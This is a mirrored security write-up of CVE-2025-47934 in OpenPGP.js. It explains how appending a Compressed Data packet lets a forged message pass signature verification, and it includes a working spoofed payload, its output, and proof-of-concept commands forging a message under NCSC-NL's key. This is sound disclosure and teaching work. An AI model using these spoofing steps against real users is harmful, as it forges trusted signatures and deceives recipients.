<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://codeanlabs.com/blog/research/cve-2025-47934-spoofing-openpgp-js-signatures/">Original</a>
    <h1>Spoofing OpenPGP.js signature verification</h1>
    
    <div id="readability-page-1" class="page"><div>
    <div>
        <div>
            <p><span>
                    <a href="https://codeanlabs.com/blog/category/research/">Research</a>                </span>
                
                <span>Thomas Rinsma</span>

                <span>06-10-2025</span>
            </p>
            
        </div>
        <figure>
            <img width="1150" height="606" src="https://codeanlabs.com/wp-content/uploads/2025/06/openpgpjs_header_v2.png" alt="" decoding="async" loading="lazy" srcset="https://codeanlabs.com/wp-content/uploads/2025/06/openpgpjs_header_v2.png 1150w, https://codeanlabs.com/wp-content/uploads/2025/06/openpgpjs_header_v2-300x158.png 300w, https://codeanlabs.com/wp-content/uploads/2025/06/openpgpjs_header_v2-1024x540.png 1024w, https://codeanlabs.com/wp-content/uploads/2025/06/openpgpjs_header_v2-768x405.png 768w" sizes="auto, (max-width: 1150px) 100vw, 1150px"/>        </figure>
        

    </div>
</div><div>
    <div>
        
    <h3>
        TL;DR    </h3>
<div>
    <p>This is a write-up of <a href="https://github.com/openpgpjs/openpgpjs/security/advisories/GHSA-8qff-qr5q-5pr8" target="_blank">CVE-2025-47934</a>, a vulnerability in OpenPGP.js found by Codean Labs, which was patched in v5.11.3 and v6.1.1.</p>
<p>After obtaining a valid signature made by a target author (‚ÄúAlice‚Äù), an attacker could abuse this vulnerability to ‚Äúspoof‚Äù arbitrary signatures by Alice (even as encrypted messages), i.e. making it look (to OpenPGP.js users) as if Alice signed any arbitrary message. Given that this is a core principle of PGP which directly affects some integrating applications, the overall risk was considered to be critical.</p>
<p>This write-up explains how this was possible, and provides a proof-of-concept at the end.</p>
</div>

    <h2>
        Introduction    </h2>
<div>
    <p>The OpenPGP.js library provides an implementation of the OpenPGP standard specified in <a href="https://datatracker.ietf.org/doc/rfc9580/" target="_blank">RFC 9580</a>. If you‚Äôve ever used encrypted email or signed git commits, you may be familiar with this standard. On a high level the OpenPGP standard supports message encryption (symmetric and asymmetric), message signing, and functionality for key management.</p>
<p>With OpenPGP.js, it is possible to do all of this in JavaScript. It is used by several web-based email clients that support encryption, including Proton Mail and Mailvelope.</p>
</div>

    <h3>
        The OpenPGP message format    </h3>
<div>
    <p>All PGP payloads (messages, detached signatures and keys) simply consist of a sequence of packets; there is no overarching header. These packets follow a relatively simple but custom binary protocol as defined by the standard. The resulting binary payload can be sent as-is but is often base64-encoded, resulting in an ‚ÄúASCII-armored‚Äù payload such as the following:</p>
<pre><code>
-----BEGIN PGP MESSAGE-----
owGbwMvMwCV2JXpbW1xI0SnG0zxJDBkOns8zUnNy8rk6SlkYxLgYZMUUWWJ1LuTu
9HFSqpFcxgtTzcoEUsrAxSkAE4nSYPgrzdL1bQ1bvfG9h44/3Dtkk7njvjC9XHE/
2kzwLeOV+vTNjAyHZt4/96P3wN0H7x7Y79oondUbIc6a+Onj3578CtEn4Xu5AQ==
=0dLq
-----END PGP MESSAGE-----
</code></pre>
<p>This signed message consists of the following packets:</p>
<ol>
<li><em>Compressed Data</em> packet: itself containing a ZIP-compressed packet-list:
<ol>
<li><em>One-Pass Signature</em> packet: an optional packet containing (among other things) the hash algorithm used, so the verifier can already start hashing the data that follows.</li>
<li><em>Literal Data</em> packet: containing the message ‚Äúhello‚Äù.</li>
<li>
<em>Signature</em> packet: containing the cryptographic (EdDSA) signature on the hash of the data before it.</li>
</ol>
</li>
</ol>
<p>There is quite some flexibility in this structure. For example, the enveloping <em>Compressed Data</em> packet is entirely optional. Alternatively, the inner <em>Literal Data</em> packet could be replaced with a <em>Compressed Data</em> packet, containing even more packets, for example those belonging to an encrypted message or another signature. The allowed packet structures are formalized in grammar rules defined in the standard (<a href="https://datatracker.ietf.org/doc/rfc9580/" target="_blank">RFC 9580</a>, Section 10.3).</p>
</div>

    <h2>
        An invalid packet list    </h2>
<div>
    <p>Now let‚Äôs consider a PGP message with the following packet list, where packets 1-3 make up a legitimate signed message but a fourth packet is added:</p>
<ol>
<li><em>One-Pass Signature</em> packet</li>
<li><em>Literal Data</em> packet (‚Äúlegitimate‚Äù)</li>
<li><em>Signature</em> packet (valid over packet 1)</li>
<li><em>Compressed Data</em> packet, containing <em>Literal Data</em> packet (‚Äúmalicious‚Äù)</li>
</ol>
<p>Because of the stray <em>Compressed Data</em> packet at the end, this is not a valid OpenPGP message.</p>
<p>To demonstrate this, let‚Äôs take a simple verification program, similar to what is given in the official <a href="https://github.com/openpgpjs/openpgpjs?tab=readme-ov-file#sign-and-verify-cleartext-messages" target="_blank">documentation</a>, and give it our peculiar packet list as a message:</p>
<pre><code>
const openpgp = require(&#39;openpgp&#39;);

(async () =&gt; {
    // Generated using:
    //   cat \
    //     &lt;(echo &#34;legitimate&#34; | gpg -s -z0) \
    //     &lt;(printf &#34;\xc8\x12\0\xcb\x0f\x62\0\0\0\0\0malicious&#34;) \
    //   | base64
    let armoredMessage = `
-----BEGIN PGP MESSAGE-----

kA0DAAoW1Fu2hl5UcsoByxFiAGhBNptsZWdpdGltYXRlCoh1BAAWCgAdFiEEXSzQbblMQiJ8GaYN
1Fu2hl5UcsoFAmhBNpsACgkQ1Fu2hl5UcsqE0QD/bsWYHJrrrK8RM8VgB4Z3K64zWfp49BOi+x0s
9VJKyRoBALJdQhGzPwCERCANPR+KdX5ZdrX54ZpY9mriFG6O4hsFyBIAyw9iAAAAAABtYWxpY2lv
dXM=
-----END PGP MESSAGE-----`;

    // public key of thomas@codean.io
    const publicKeyArmored = `
-----BEGIN PGP PUBLIC KEY BLOCK-----

mDMEZSAfBhYJKwYBBAHaRw8BAQdAfdgd2yxL+pYN91ENyp/VZVdWXLjYDONG47jM
4dDZDMG0IFRob21hcyBSaW5zbWEgPHRob21hc0Bjb2RlYW4uaW8+iI8EExYIADcW
IQRdLNBtuUxCInwZpg3UW7aGXlRyygUCZSAfBgUJBaOagAIbAwQLCQgHBRUICQoL
BRYCAwEAAAoJENRbtoZeVHLKpvIBANiaDeLPyaQyHkuzB8T6ZqvfJi4dXNlsqT2F
dlUUip4ZAQDSAljghQC9jAQu8I8yMrQJd4SXD1EMH+NLNNYCDEZCC7g4BGUgHwYS
CisGAQQBl1UBBQEBB0DOFmUm2nMIda8PzTquulLLy/bFwDtSqAiK1EBqEdvbaAMB
CAeIfgQYFggAJhYhBF0s0G25TEIifBmmDdRbtoZeVHLKBQJlIB8GBQkFo5qAAhsM
AAoJENRbtoZeVHLKCE8BAJEXE6za1G6pFpaZWKBRMlCbBDSE4rc7iEn5MpC56WtQ
AQCnVhRNYBjQ7Bo/VX1rx2+6wx84EXOFmoW80F96QmN0Bw==
=Obk+
-----END PGP PUBLIC KEY BLOCK-----`;

    const publicKey = await openpgp.readKey({ armoredKey: publicKeyArmored });
    const message = await openpgp.readMessage({ armoredMessage });
    const verificationResult = await openpgp.verify({ message, verificationKeys: publicKey });

    console.log(`Signed message data: ${verificationResult.data}`);
    const { verified, keyID } = verificationResult.signatures[0];
    try {
        await verified; // throws on invalid signature
        console.log(`Verified signature by key id ${keyID.toHex()}`);
    } catch (e) {
        throw new Error(`Signature could not be verified: ${e.message}`);
    }
})();

</code></pre>
<p>printing the following to console:</p>
<pre><code>
Signed message data: malicious
Verified signature by key id d45bb6865e5472ca
</code></pre>
<p>This is bad! It means an attacker can use any previous valid signature made by a victim, and ‚Äúreplace‚Äù the signed data with anything while the signature remains valid.</p>
<p>To understand why this happens, we need to look at how OpenPGP.js parses messages.</p>
</div>

    <h2>
        A critical mistake    </h2>
<div>
    <p>An incoming PGP message is parsed by using the high-level API <code>openpgp.readMessage()</code>, which eventually calls <code>PacketList.read()</code>.</p>
<p>
The OpenPGP packet format allows packet types that contain arbitrary-length data to be split into chunks using a <em>Partial Body Length</em> in their header. Some logic is required on the parsing side to recombine these packets, hence this is what <code>supportsStreaming()</code> refers to.
</p>
<pre><code>
    // Wait until first few packets have been read
    const reader = streamGetReader(this.stream);
    while (true) {
      const { done, value } = await reader.read();
      if (!done) {
        this.push(value);
      } else {
        this.stream = null;
      }
      if (done || supportsStreaming(value.constructor.tag)) {
        break;
      }
    }
</code></pre>
<p>If we take our malicious packet list from before, it means that after this loop (i.e., after calling <code>openpgp.readMessage()</code>), the message‚Äôs internal <code>packets</code> array (an instance of <code>PacketList</code>) will contain only packets 1 and 2, the <em>One-Pass Signature</em> and <em>Literal Data</em> (‚Äúlegitimate‚Äù) packets. The rest of the packets are presumably not needed yet, and hence still pending to be read from the packet stream.</p>
<p>Next, the user calls the high-level API <code>openpgp.verify()</code> on the message object returned by <code>openpgp.readMessage()</code>. This will invoke the internal method <code>Message.verify()</code> which starts as follows:</p>
<pre><code>
  async verify(verificationKeys, date = new Date(), config = defaultConfig) {
    const msg = this.unwrapCompressed(); // (1)
    
    const literalDataList = msg.packets.filterByTag(enums.packet.literalData);
    if (literalDataList.length !== 1) {
      throw new Error(&#39;Can only verify message with one literal data packet.&#39;);
    }
    
    if (isArrayStream(msg.packets.stream)) {
      msg.packets.push(...await streamReadToEnd(msg.packets.stream, _ =&gt; _ || [])); // (2)
    }

    const onePassSigList = msg.packets.filterByTag(enums.packet.onePassSignature).reverse();
    const signatureList = msg.packets.filterByTag(enums.packet.signature);

    // ...
</code></pre>
<p>For the purposes of signature verification, this function obtains the <em>Literal Data</em> packet (<code>literalDataList</code>) and the <em>Signature</em> packet (<code>signatureList</code>) from the message.</p>
<p>This is a helper method that either returns the packet list inside the first <em>Compressed Data</em> packet it finds or just returns <code>this</code> (the original packet list) if no <em>Compressed Data</em> packets are found:</p>
<pre><code>
  unwrapCompressed() {
    const compressed = this.packets.filterByTag(enums.packet.compressedData);
    if (compressed.length) {
      return new Message(compressed[0].packets);
    }
    return this;
  }
</code></pre>
<p>At this point, <code>this.packets</code> still consists only of packets 1 and 2 of our payload (<em>One-Pass Signature</em> and <em>Literal Data</em> (‚Äúlegitimate‚Äù)), hence <code>this</code> is returned and packet 2 is used as <code>literalDataList</code>.</p>
<p>Given that packet 3 is a valid <em>Signature</em> over packet 2 (‚Äúlegitimate‚Äù), <code>message.verify()</code> will succeed and the control flow returns to <code>openpgp.verify()</code>:</p>
<pre><code>
    ...
    if (signature) {
      result.signatures = await message.verifyDetached(signature, verificationKeys, date, config);
    } else {
      result.signatures = await message.verify(verificationKeys, date, config);
    }
    result.data = format === &#39;binary&#39; ? message.getLiteralData() : message.getText();
    ...
</code></pre>
<p>Next, <code>result.data</code> is set to the output of <code>message.getLiteralData()</code> (or <code>message.getText()</code>, functionally equivalent), which again makes use of <code>unwrapCompressed()</code>:</p>
<pre><code>
  getLiteralData() {
    const msg = this.unwrapCompressed();
    const literal = msg.packets.findPacket(enums.packet.literalData);
    return (literal &amp;&amp; literal.getBytes()) || null;
  }
</code></pre>
<p>This time however, <code>msg.packets</code> contains the full packet list (due to <code>streamReadToEnd()</code> which was called before), and hence <code>unwrapCompressed()</code> will return the contents of the first <em>Compressed Data</em> packet it encounters (packet 4), which is the attacker-inserted <em>Literal Data</em> packet (‚Äúmalicious‚Äù).</p>
<p>At this point after verification, manually calling <code>message.getText()</code> will also return the malicious <em>Literal Data</em> contents:</p>
<pre><code>
const message = await openpgp.readMessage({ payload });

console.log(message.getText()); // prints &#34;legitimate&#34;

const verificationResult = await openpgp.verify({ message, verificationKeys: publicKey });
// verificationResult represents a valid signature

console.log(message.getText()); // prints &#34;malicious&#34;
console.log(verificationResult.data); // prints &#34;malicious&#34;
</code></pre>
<p>This logic was clearly intended to flexibly deal with both compressed and uncompressed <em>Literal Data</em> packets. But it seems that nobody considered such a malformed packet list!</p>
</div>

    <h2>
        Encrypted messages    </h2>
<div>
    <p>For messages that are signed and encrypted, the situation is even worse. The high-level API <code>openpgp.decrypt()</code> combines decryption and verification, and it is common (e.g., in the <a href="https://github.com/openpgpjs/openpgpjs?tab=readme-ov-file#encrypt-and-decrypt-string-data-with-pgp-keys" target="_blank">official example code</a>) to obtain the decrypted data from its <code>data</code> output, while determining the signature‚Äôs validity based on its <code>signatures</code> output.</p>
<p>As <code>openpgp.decrypt()</code> just uses the same verification logic under the hood, it has the same flaw. Therefore, the returned <code>data</code> is the attacker-controlled payload (‚Äúmalicious‚Äù), while the signature verification result is calculated on the original payload (‚Äúlegitimate‚Äù).</p>
<pre><code>
const { data, signatures } = await openpgp.decrypt({
    message,
    verificationKeys: publicKey
    decryptionKeys: privateKey
});
console.log(data); // prints &#34;malicious&#34;

try {
    await signatures[0].verified;
    console.log(&#39;Signature is valid&#39;); // prints &#34;Signature is valid&#34;
} catch (e) {}
</code></pre>
<p>There is no escape hatch like with <code>openpgp.verify()</code>, where <code>message.getText()</code> may be called before verification. The only safe usage would be to perform decryption separately from verification in two distinct steps, by not using the <code>verificationKeys</code> parameter in the first step.</p>
</div>

    <h2>
        Proof-of-Concept    </h2>
<div>
    <p>Download these files from <a href="https://github.com/codean-labs/pocs/tree/main/CVE-2025-47934%20(OpenPGP.js)" target="_blank">our PoC repository</a>.</p>
<p>As shown above, constructing a malicious payload is a only a matter of taking an existing signed message (removing the wrapping compression if needed), and appending a <em>Compressed Data</em> packet containing a malicious <em>Literal Data</em> packet. To make it easy to add arbitrary malicious text, we‚Äôve written a small Python script (<code>generate_spoofed_message.py</code>) which produces the packet headers for you and prints an ASCII-armored version of the spoofed message:</p>
<pre><code>
$ echo &#34;hello world&#34; | gpg -s -z0 &gt; legit_signed_message.pgp
$ python generate_spoofed_message.py legit_signed_message.pgp &gt; spoofed_message.asc
$ node validate_signature.js spoofed_message.asc &lt;(gpg --export -a thomas@codean.io)
Signed message data: malicious
Verified signature by key id d45bb6865e5472ca: Thomas Rinsma &lt;thomas@codean.io&gt;
</code></pre>
<p>Additionally, <code>extract_from_clearsign_and_spoof.py</code> shows how it is possible to extract the Signature packet from a clear-signed message, and generate a spoofed message from that. Here‚Äôs the NCSC (the National Cyber Security Center of the Netherlands) saying something totally legit üòâ</p>
<pre><code>
# Extract victim&#39;s PGP key and a clear-signed message (security.txt in this case)
$ wget https://www.ncsc.nl/binaries/ncsc/documenten/publicaties/2025/januari/06/pgp-key/pgp.txt
$ wget https://www.ncsc.nl/.well-known/security.txt
# Generate the spoofed message
$ python extract_from_clearsign_and_spoof.py security.txt &gt; spoofed_message.asc
</code></pre>
<pre><code>
$ node validate_signature.js spoofed_message.asc pgp.txt
Signed message data: Hello from Codean Labs.
Verified signature by key id cad4ceab247e705f: NCSC-NL 2025 &lt;cert@ncsc.nl&gt;,NCSC-NL 2025 general information &lt;info@ncsc.nl&gt;
</code></pre>
</div>

    <h2>
        Mitigation    </h2>
<div>
    <p>
At Codean Labs we realize as no other how difficult it is to make secure software. We provide you with the insights to know which risks you are facing, and when required, help you mitigate these risks. We perform application security assessments in an efficient, thorough and human manner, allowing you to focus on development. <a href="https://codeanlabs.com/pentest/" target="_blank" rel="noopener">Click here</a> to learn more.
</p>
<p>Update your version of OpenPGP.js to v5.11.3 or v6.1.1 to mitigate this vulnerability. If you use Mailvelope or other software that indirectly uses OpenPGP.js, make sure to update that as well. If you use OpenPGP.js directly and you‚Äôre unable to update, the <a href="https://github.com/openpgpjs/openpgpjs/security/advisories/GHSA-8qff-qr5q-5pr8" target="_blank">advisory written by the maintainers</a> also contains alternative workarounds.</p>
<p>To fix this issue, the developers have started to implement strict grammar verification, helping to make sure that invalid messages like our malicious packet list are rejected early on. We think this is a great approach as it reduces the attack surface and it might help prevent future issues of the same kind.</p>
</div>

    <h2>
        Timeline    </h2>
<div>
    <ul>
<li>2025-05-06 ‚Äì Report submitted to the OpenPGP.js Bug Bounty program on YesWeHack</li>
<li>2025-05-12 ‚Äì More information provided on crafting malicious payloads</li>
<li>2025-05-13 ‚Äì Finding acknowledged by maintainers, start of coordinated fix roll-out</li>
<li>2025-05-19 ‚Äì CVE-2025-47934 assigned, <a href="https://github.com/openpgpjs/openpgpjs/security/advisories/GHSA-8qff-qr5q-5pr8" target="_blank">advisory</a> and fixes released
<ul>
<li>OpenPGP.js v5.11.3 and v6.1.1 released</li>
<li>Mailvelope v6.0.1 released</li>
</ul>
</li>
<li>2025-06-10 ‚Äì This blog post is published</li>
</ul>
</div>
    </div>
</div></div>
  </body>
</html>
